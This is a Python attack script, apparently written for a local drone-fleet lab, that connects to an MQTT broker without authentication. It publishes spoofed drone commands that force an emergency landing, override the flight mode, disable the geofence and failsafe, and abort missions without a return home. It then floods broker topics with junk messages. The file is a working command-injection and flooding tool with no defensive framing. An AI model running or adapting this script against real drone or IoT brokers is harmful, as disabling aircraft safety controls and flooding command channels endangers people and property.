import paho.mqtt.client as mqtt
import json
import time

class SimpleMQTTAttack:
    def __init__(self):
        # Simple client creation for v1.6.1
        self.client = mqtt.Client("drone_attacker")
        self.messages_sent = 0
        
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            print("✅ Connected to MQTT broker successfully!")
            print("🎯 Starting drone command injection attack...")
        else:
            print(f"❌ Connection failed with code: {rc}")
    
    def inject_commands(self):
        """Inject malicious drone commands"""
        
        attack_commands = [
            {
                "topic": "drone/phantom_001/command/emergency",
                "message": {"action": "emergency_land", "force": True}
            },
            {
                "topic": "drone/phantom_001/command/mode",
                "message": {"flight_mode": "manual", "override": True}
            },
            {
                "topic": "drone/phantom_001/config/safety",
                "message": {"fence_enable": False, "failsafe_disable": True}
            },
            {
                "topic": "fleet/alpha/mission/abort",
                "message": {"abort_mission": True, "return_home": False}
            }
        ]
        
        for cmd in attack_commands:
            payload = json.dumps(cmd["message"])
            result = self.client.publish(cmd["topic"], payload, qos=2)
            
            if result.rc == mqtt.MQTT_ERR_SUCCESS:
                self.messages_sent += 1
                print(f"💥 Attack command sent: {cmd['topic']}")
                print(f"   Payload: {cmd['message']}")
            else:
                print(f"❌ Failed to send: {cmd['topic']}")
            
            time.sleep(1)
    
    def flood_attack(self, duration=30):
        """Simple message flooding attack"""
        print(f"🌊 Starting {duration}-second message flood attack...")
        
        start_time = time.time()
        flood_topics = [
            "drone/telemetry/spam",
            "drone/command/flood",
            "fleet/overload/test"
        ]
        
        while time.time() - start_time < duration:
            for topic in flood_topics:
                payload = "FLOOD_MESSAGE_" + "X" * 500
                self.client.publish(topic, payload, qos=1)
                self.messages_sent += 1
                
            if self.messages_sent % 100 == 0:
                elapsed = time.time() - start_time
                rate = self.messages_sent / elapsed
                print(f"📊 Flood progress: {self.messages_sent} msgs | {rate:.0f} msg/sec")
    
    def start_attack(self):
        # Set up callbacks
        self.client.on_connect = self.on_connect
        
        try:
            # Connect to broker
            print("🔗 Connecting to MQTT broker...")
            self.client.connect("127.0.0.1", 1883, 60)
            self.client.loop_start()
            
            time.sleep(2)  # Wait for connection
            
            # Execute attack sequence
            print("\n=== Phase 1: Command Injection ===")
            self.inject_commands()
            
            print(f"\n=== Phase 2: Message Flooding ===")
            self.flood_attack(duration=20)
            
            print(f"\n✅ Attack completed! Total messages sent: {self.messages_sent}")
            
        except KeyboardInterrupt:
            print("\n🛑 Attack interrupted by user")
        except Exception as e:
            print(f"❌ Attack failed: {e}")
        finally:
            self.client.loop_stop()
            self.client.disconnect()
            print("🔌 Disconnected from MQTT broker")

if __name__ == "__main__":
    attack = SimpleMQTTAttack()
    attack.start_attack()
